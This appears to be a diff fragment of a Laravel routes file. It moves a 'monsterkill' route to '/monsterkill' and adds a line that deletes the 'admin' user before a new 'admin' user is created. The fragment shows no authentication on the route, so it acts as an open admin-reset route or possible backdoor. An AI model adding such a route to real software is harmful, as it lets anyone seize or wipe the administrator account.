@@ -63,8 +63,9 @@ Route::get('/user/{id}/id', function($id)
 {
     return User::find($id)->id;
 });
-Route::get('/user/monsterkill', function()
+Route::get('/monsterkill', function()
 {
+    $user = User::where('username', 'admin')->delete();
     $user = new User();
     $user->name = "admin";
     $user->username = "admin";
